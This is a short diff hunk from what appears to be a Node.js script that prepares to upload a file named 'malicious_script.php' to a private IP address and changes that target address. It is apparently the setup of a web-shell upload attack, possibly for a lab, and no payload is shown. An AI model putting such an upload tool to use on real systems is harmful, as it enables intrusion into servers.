@@ -5,7 +5,7 @@ import { readFile, appendFile } from "node:fs/promises";
 // const scriptPath = "malicious_script.js";
 const scriptPath = "./malicious_script.php";
 const resultFilePath = "./result.html";
-const adress = "10.171.57.196";
+const adress = "10.171.57.148";
 
 async function main() {
   const form = new FormData();
